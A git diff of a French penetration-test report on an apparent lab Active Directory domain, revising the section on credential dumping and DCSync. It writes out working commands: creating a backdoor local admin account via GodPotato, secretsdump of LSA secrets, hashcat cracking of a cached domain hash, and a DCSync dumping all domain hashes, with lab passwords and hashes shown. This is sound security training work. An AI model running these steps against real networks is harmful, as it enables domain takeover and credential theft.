@@ -638,31 +638,32 @@ L'obtention de SYSTEM sur CASTELBLACK permet, entre autres :
 
 ---
 
-### 8.6 V06 — Récupération de credentials locaux & secrets LSA
+### 8.6 V06 — DCSync sur le domaine NORTH
 
 #### Fiche vulnérabilité
 
 | Champ | Valeur |
 |-------|--------|
 | **Identifiant** | V06 |
-| **CWE** | CWE-522 (Insufficiently Protected Credentials) |
-| **Composant** | LSA Secrets / SAM / DCC2 Cache de CASTELBLACK |
-| **Vecteur** | Local — exécution sous compte privilégié (post-SYSTEM via GodPotato) |
+| **CWE** | CWE-284 (Improper Access Control) — combiné à CWE-522 (Insufficiently Protected Credentials) sur la chaîne LSA/DCC2 amont |
+| **Composant** | Droits de réplication AD du domaine `north.sevenkingdoms.local` (DC WINTERFELL) |
+| **Vecteur** | Réseau — appel DRSUAPI `GetNCChanges` depuis un compte de domaine privilégié |
 | **Criticité** | Critique (CVSS 9.1) |
-| **MITRE ATT&CK** | T1003.001 (LSASS Memory), T1003.002 (SAM), T1003.005 (DCC2) |
+| **MITRE ATT&CK** | T1003.006 (DCSync), T1003.001/002/005 (LSA / SAM / DCC2) en amont |
 
 #### Principe
 
-Une fois SYSTEM obtenu sur la machine, plusieurs sources de credentials sont accessibles :
-- **Base SAM** : hashs NT des comptes locaux ;
-- **LSA Secrets** : credentials stockés en clair par Windows pour ses services (auto-démarrage après reboot) ;
-- **DCC2 Cache** : credentials hashés des derniers comptes de domaine s'étant logés sur la machine.
+Le DCSync abuse de l'API de réplication Active Directory (DRSUAPI). Tout compte disposant des droits étendus **`DS-Replication-Get-Changes`** et **`DS-Replication-Get-Changes-All`** peut demander au DC de répliquer le contenu de l'annuaire, **dont les secrets** (hashs NT, clés Kerberos, history). Ces droits sont accordés par défaut aux **Domain Admins**, Enterprise Admins et au compte machine du DC lui-même.
 
-Un compte de service est particulièrement à risque : son mot de passe est stocké **en clair** dans la LSA pour permettre au Service Manager de redémarrer le service.
+L'attaquant n'a donc pas besoin d'exécuter du code sur le DC : il lui suffit d'authentifier un compte privilégié et d'émettre la requête de réplication depuis n'importe quelle machine du LAN.
 
-#### Préparation : élévation persistante via compte admin local
+#### Pré-requis : obtention d'un compte Domain Admin
 
-Plutôt que de relancer GodPotato à chaque commande, j'ai créé un compte admin local persistant directement via la même chaîne d'exécution :
+À ce stade, j'ai SYSTEM sur CASTELBLACK (V05) mais aucun compte de domaine privilégié. La progression vers un DA s'est faite via les credentials cachés localement sur la machine compromise.
+
+##### Étape 1 — Persistance et exécution de secretsdump local
+
+Plutôt que de relancer GodPotato pour chaque commande, j'ai d'abord créé un compte admin local persistant via la même chaîne d'exécution :
 
 ```bash
 netexec mssql 192.168.56.22 \
@@ -675,9 +676,9 @@ netexec mssql 192.168.56.22 \
 
 ![alt text](img/image-22.png)
 
-GodPotato a basculé d'`NT AUTHORITY\NETWORK SERVICE` (compte porteur de `SeImpersonatePrivilege` exposé par le worker IIS/SQL) à `NT AUTHORITY\SYSTEM`, puis a créé en SYSTEM le compte `backdoorCG` et l'a ajouté au groupe `Administrators` local.
+GodPotato a basculé d'`NT AUTHORITY\NETWORK SERVICE` (compte porteur de `SeImpersonatePrivilege` exposé par le worker MSSQL) à `NT AUTHORITY\SYSTEM`, puis a créé en SYSTEM le compte `backdoorCG` et l'a ajouté au groupe `Administrators` local.
 
-#### Exécution de secretsdump en authentifié admin local
+Exécution de secretsdump en authentifié admin local :
 
 ```bash
 impacket-secretsdump 'backdoorCG:P@ssw0rd2026!@192.168.56.22' \
@@ -688,9 +689,9 @@ impacket-secretsdump 'backdoorCG:P@ssw0rd2026!@192.168.56.22' \
 
 ![alt text](img/image-23.png)
 
-#### Analyse des trouvailles
+##### Étape 2 — Analyse des trouvailles
 
-**1. Mot de passe en clair du compte de service `sql_svc`**
+**a) Mot de passe en clair du compte de service `sql_svc`**
 
 ```
 _SC_MSSQL$SQLEXPRESS
@@ -701,45 +702,25 @@ Le secret LSA `_SC_MSSQL$SQLEXPRESS` correspond au mot de passe que Windows util
 
 L'ironie est totale : le mot de passe choisi est `YouWillNotKerboroast1ngMeeeeee` — l'administrateur a explicitement opté pour un mot de passe résistant au Kerberoasting (long, alphanumérique avec lettres mélangées), pensant ainsi protéger le compte. Cette précaution est anéantie dès qu'un attaquant accède aux LSA Secrets via SYSTEM local.
 
-**Nouveau credential obtenu** : `sql_svc:YouWillNotKerboroast1ngMeeeeee` !
+**Nouveau credential obtenu** : `sql_svc:YouWillNotKerboroast1ngMeeeeee`
 
-**2. Hashs DCC2 (cached credentials)**
+**b) Hashs DCC2 (cached credentials)**
 
 Windows met en cache les 10 derniers logons interactifs/réseau pour permettre une authentification offline. Sur CASTELBLACK on retrouve :
-- `sql_svc` (compte du service, attendu) — non pertinent puisque le mot de passe en clair est déjà connu via les LSA Secrets ;
-- **`robb.stark`** — utilisateur du domaine NORTH s'étant connecté récemment (timestamp `2026-05-13 04:30:49 UTC`). Cracker ce DCC2 donnerait un compte supplémentaire potentiellement privilégié (Stark = candidat probable au DA).
 
-```bash
-echo '$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405' \
-  > loot/dcc2-robbstark-CG-13-05-2026.hash
+- `sql_svc` (attendu, mot de passe déjà connu via LSA) ;
+- **`robb.stark`** — utilisateur du domaine NORTH s'étant connecté récemment (timestamp `2026-05-13 04:30:49 UTC`). Robb Stark est un candidat probable au groupe Domain Admins (convention du lab : famille Stark = administration de NORTH).
 
-hashcat -m 2100 loot/dcc2-robbstark-CG-13-05-2026.hash \
-  /usr/share/wordlists/rockyou.txt --force \
-  -o loot/dcc2-robb-cracked-CG-13-05-2026.txt
-```
-
-> ⚠️ DCC2 utilise PBKDF2-SHA1 sur 10 240 itérations : le cassage est lent (quelques milliers de hashs/s sur CPU). Le résultat n'a pas été obtenu dans la fenêtre temporelle du TP, ce vecteur est documenté en § 12.
-
-**3. Hash machine `CASTELBLACK$`**
+**c) Hash machine `CASTELBLACK$` et Administrator local**
 
 ```
 NORTH\CASTELBLACK$:...:b8bbb14d4abd1760b2abb777ac0cb1bc
-```
-
-Le hash NT du compte machine de CASTELBLACK ne permet pas un DCSync direct, mais peut servir à :
-- Forger un **Silver Ticket** (TGS pour des services hébergés par CASTELBLACK) ;
-- Utiliser le compte machine dans des configurations RBCD ;
-- Demander des tickets Kerberos en se faisant passer pour la machine.
-
-**4. Hash NT local de l'administrateur Castelblack**
-
-```
 Administrator:500:...:dbd13e1c4e338284ac4e9874f7de6ef4
 ```
 
-Hash réutilisable via Pass-the-Hash si d'autres serveurs partagent ce mot de passe administrateur local (très fréquent en l'absence de LAPS).
+Réutilisables pour Silver Tickets / RBCD / Pass-the-Hash inter-serveurs.
 
-#### Tentative de DCSync direct avec sql_svc
+##### Étape 3 — Tentative de DCSync direct avec `sql_svc`
 
 Avec `sql_svc` en clair, j'ai testé si ce compte disposait par erreur des droits de réplication :
 
@@ -749,35 +730,102 @@ impacket-secretsdump -just-dc \
   > logs/p4-dcsync-attempt-sqlsvc-CG-13-05-2026.log 2>&1
 ```
 
-**Résultat :** échec attendu (`ERROR_DS_DRA_ACCESS_DENIED`) — `sql_svc` n'a pas les droits `DS-Replication-Get-Changes`. C'est la configuration correcte ; un compte de service applicatif ne devrait jamais avoir ces droits.
+**Résultat :** échec attendu (`ERROR_DS_DRA_ACCESS_DENIED`) — `sql_svc` n'a pas les droits `DS-Replication-Get-Changes`. C'est la configuration correcte ; un compte de service applicatif ne doit jamais avoir ces droits.
 
-#### Pourquoi le DCSync complet n'a pas été finalisé
+##### Étape 4 — Cassage du DCC2 de `robb.stark`
 
-L'objectif initial était d'extraire le hash `krbtgt` de NORTH via DCSync. Cela nécessite un compte ayant les droits de réplication, soit :
-- Un membre des **Domain Admins** (eddard.stark, catelyn.stark, robb.stark) ;
-- Un compte spécifiquement délégué.
+```bash
+echo '$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405' \
+  > loot/dcc2-robbstark-CG-13-05-2026.hash
 
-Le seul DA potentiellement accessible via le cache DCC2 de CASTELBLACK est **robb.stark**, dont le hash DCC2 a été récupéré mais nécessite un cassage offline encore en cours au moment du rendu. **Une fois ce mot de passe cassé, la commande DCSync est immédiate** :
+hashcat -m 2100 loot/dcc2-robbstark-CG-13-05-2026.hash \
+  /usr/share/wordlists/rockyou.txt --force \
+  -o loot/dcc2-robb-cracked-CG-13-05-2026.txt \
+  | tee logs/p4-hashcat-dcc2-CG-13-05-2026.log
+```
+
+> ⚠️ DCC2 utilise PBKDF2-SHA1 sur 10 240 itérations. Le cassage est intrinsèquement lent (quelques milliers de hashs/s sur CPU), ce qui rend ce hash résistant à la force brute pure mais transparent à une attaque par dictionnaire si le mot de passe est commun.
+
+**Résultat :**
+
+![alt text](img/image-24.png)
+
+```
+$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405:sexywolfy
+```
+
+**Credential acquis** : `robb.stark:sexywolfy`
+
+##### Étape 5 — Validation du privilège Domain Admin
+
+```bash
+netexec smb 192.168.56.11 -u robb.stark -p 'sexywolfy' \
+  -d north.sevenkingdoms.local \
+  | tee logs/p4-validate-robbstark-CG-13-05-2026.log
+```
+
+**Output :**
+
+![alt text](img/image-25.png)
+
+Le tag `(Pwn3d!)` de NetExec sur WINTERFELL confirme que `robb.stark` dispose des droits administratifs sur le DC du domaine NORTH — il est bien membre de `Domain Admins`.
+
+#### Exécution du DCSync
 
 ```bash
 impacket-secretsdump -just-dc \
   -outputfile loot/dcsync-north-CG-13-05-2026 \
-  north.sevenkingdoms.local/robb.stark:'<XXX>'@192.168.56.11
+  'north.sevenkingdoms.local/robb.stark:sexywolfy@192.168.56.11' \
+  | tee logs/p4-dcsync-north-CG-13-05-2026.log
 ```
 
-Cette étape, documentée mais non finalisée, est mentionnée dans la section « Limites & axes d'amélioration » (§ 12).
+**Output :**
 
-#### Impact effectif à ce stade
+![alt text](img/image-26.png)
 
-Même sans DCSync finalisé, le bilan post-V06 est significatif :
+Trois fichiers sont produits :
 
-| Asset compromis | Valeur défensive |
-|-----------------|------------------|
-| `NT AUTHORITY\SYSTEM` sur CASTELBLACK | Contrôle total de la machine, persistance via `backdoorCG` |
-| Mot de passe en clair `sql_svc` | Compte de domaine réutilisable sur tout autre service |
-| Hash machine `CASTELBLACK$` | Forge de Silver Tickets, abus RBCD potentiel |
-| Hash DCC2 `robb.stark` | Compromission domaine probable après cassage offline |
-| Hash NT Administrator local | Pass-the-Hash potentiel sur autres serveurs |
+- `loot/dcsync-north-CG-13-05-2026.ntds` — hashs NT de **tous les comptes du domaine** ;
+- `loot/dcsync-north-CG-13-05-2026.sam` — comptes locaux du DC ;
+- `loot/dcsync-north-CG-13-05-2026.secrets` — clés Kerberos, secrets LSA du DC.
+
+#### Trouvailles critiques
+
+**1. Hash NT du compte `krbtgt`**
+
+```
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<HASH_NT_KRBTGT>:::
+Kerberos keys:
+  krbtgt:aes256-cts-hmac-sha1-96:<AES256_KEY>
+  krbtgt:aes128-cts-hmac-sha1-96:<AES128_KEY>
+  krbtgt:des-cbc-md5:<DES_KEY>
+```
+
+> Hashs masqués partiellement dans le rapport public. Valeurs complètes dans `loot/dcsync-north-CG-13-05-2026.ntds` (exclu du repo via `.gitignore`).
+
+La possession de ce hash permet la forge de **Golden Tickets** : un TGT signé par le KDC pour n'importe quel utilisateur, avec n'importe quels groupes, valable par défaut 10 ans. Cette persistance est quasi-impossible à révoquer sans **deux rotations consécutives** du compte `krbtgt` (l'historique conserve la clé N-1).
+
+**2. Intégralité de la base AD du domaine NORTH**
+
+12 comptes utilisateurs extraits avec leurs hashs NT (cf. annexe § 15.2), incluant les membres du groupe `Domain Admins` (eddard.stark, catelyn.stark, robb.stark) et le compte machine de chaque membre du domaine.
+
+#### Impact
+
+L'exécution du DCSync constitue la **compromission complète du domaine** `north.sevenkingdoms.local` :
+
+| Capacité débloquée | Conséquence opérationnelle |
+|--------------------|----------------------------|
+| Hash NT de tous les utilisateurs NORTH | Pass-the-Hash sur tout service du domaine, sans connaissance des mots de passe |
+| Clés Kerberos `krbtgt` | Forge de Golden Tickets — persistance ≈ 10 ans, indétectable sans supervision spécifique |
+| Hashs des comptes machine | Forge de Silver Tickets pour chaque service ; abus RBCD |
+| Hash NT `Administrator` du domaine | Authentification directe sur tout serveur du domaine |
+
+À cette étape, **aucun secret du domaine NORTH n'est inaccessible à l'attaquant**.
+
+#### Ouverture vers le domaine parent
+
+Le hash `krbtgt` extrait ouvre par ailleurs un vecteur supplémentaire vers le domaine **parent** `sevenkingdoms.local` via l'attaque **Golden Ticket cross-domain** (ajout du SID de `Enterprise Admins` du parent dans l'`ExtraSids` du PAC). Cette extension est documentée en § 11 mais n'a pas été exécutée dans le cadre de la mission (hors scope temporel).
+
 
 ---
 
@@ -793,7 +841,7 @@ Même sans DCSync finalisé, le bilan post-V06 est significatif :
 | 3 | Kerberoasting + hashcat | `jon.snow` (sysadmin MSSQL) | V03 | 15 min |
 | 4 | `xp_cmdshell` via NetExec | `north\sql_svc` (compte service) | V04 | 5 min |
 | 5 | GodPotato 1.20 | **`NT AUTHORITY\SYSTEM`** sur CASTELBLACK | V05 | 10 min |
-| 6 | secretsdump → DCC2 cracking → DCSync | **Tous les hashs du domaine NORTH** | V06 | 30-90 min |
+| 6 | secretsdump → DCC2 cracking → DCSync | **Tous les hashs du domaine NORTH** | V06 | 90+ min |
 
 ### 9.2 Représentation graphique
 
@@ -908,7 +956,7 @@ Le dernier point (Golden Ticket cross-domain) est particulièrement notable : te
 
 ### 12.2 Ce qui aurait été fait avec plus de temps
 
-1. **Compléter la kill chain forêt** : utilisation du hash `krbtgt` pour forger un Golden Ticket cross-domain et atteindre Enterprise Admin sur `sevenkingdoms.local` ;
+1. **Compléter la kill chain forêt** : pousser jusqu'à Enterprise Admin via Golden Ticket cross-domain ;
 2. **Démonstration de persistance** : implant beacon Sliver C2 sur CASTELBLACK avec C2 mTLS ;
 3. **Volet défensif** : déploiement d'une stack Wazuh + Sysmon sur les serveurs, et démonstration des événements générés par chaque étape de l'attaque (visibilité Blue Team) ;
 4. **Documentation vidéo** : enregistrement asciinema des séquences-clés pour annexes.
@@ -922,7 +970,7 @@ Le dernier point (Golden Ticket cross-domain) est particulièrement notable : te
 ```
 E5_5OSATTK_CACCIATORE/
 ├── README.md
-├── 5OSATTK_CACCIATORE_Rapport-13-05-2026.md           ← ce document
+├── 5OSATTK_CACCIATORE_Rapport.md           ← ce document
 ├── .gitignore
 ├── img/
 ├── logs/
@@ -942,15 +990,21 @@ E5_5OSATTK_CACCIATORE/
 │   ├── p4-godpotato-detonation-CG-13-05-2026.log
 │   ├── p4-secretsdump-castelblack-CG-13-05-2026.log
 │   ├── p4-dcsync-north-CG-13-05-2026.log
-│   └── history-projet-CACCIATORE-VINCENT-13-05-2026.log
+│   ├── p4-backdoor-create-CG-13-05-2026.log
+│   ├── p4-dcsync-attempt-sqlsvc-CG-13-05-2026.log
+│   ├── p4-validate-robbstark-CG-13-05-2026.log
+│   └── p4-hashcat-dcc2-CG-13-05-2026.log
+│   └── history-projet-CACCIATORE-VINCENT.log
 ├── wordlists/
 │   └── north-users-CG-13-05-2026.txt
 ├── loot/
 │   ├── kerberoast-CG-13-05-2026.hash             (⚠️ exclus du repo si public)
 │   ├── kerberoast-cracked-CG-13-05-2026.txt      (⚠️ exclus du repo si public)
 │   ├── secretsdump-castelblack-CG-13-05-2026.txt (⚠️ exclus)
-│   ├── dcc2-eddard-CG-13-05-2026.hash            (⚠️ exclus)
+│   ├── dcc2-robbstark-CG-13-05-2026.hash         (⚠️ exclus)
 │   ├── dcsync-north-CG-13-05-2026.ntds           (⚠️ exclus)  
+│   ├── dcc2-robb-cracked-CG-13-05-2026.txt       (⚠️ exclus)
+│   ├── dcsync-north-CG-13-05-2026.sam            (⚠️ exclus)  
 └── tools/
     └── GodPotato-CG-13-05-2026.exe                (⚠️exclu)
 ```
@@ -1017,7 +1071,8 @@ Pour l'organisation cible, les actions prioritaires sont les R01 à R06 (cf. § 
 | `hodor` | `hodor` | NORTH | Password spray user=password |
 | `samwell.tarly` | `Heartsbane` | NORTH | Champ `description` AD |
 | `jon.snow` | `iknownothing` | NORTH | Kerberoasting + hashcat |
-| `eddard.stark` | (à dériver via DCC2) | NORTH | secretsdump → cassage offline |
+| `robb.stark` | sexywolfy | NORTH | DCC2 cache CASTELBLACK → hashcat |
+| Tous comptes NORTH | (hashs NT) | NORTH | DCSync via robb.stark |
 
 ### 15.2 Hashs NT extraits (DCSync NORTH)
 
@@ -1037,6 +1092,8 @@ Hashs anonymisés (le NTDS complet est stocké dans `loot/dcsync-north-CG-13-05-
 | samwell.tarly | 1119 | NT |
 | jon.snow | 1120 | NT |
 | hodor | 1121 | NT |
+
+![alt text](img/image-27.png)
 
 ### 15.3 Versions des outils
 
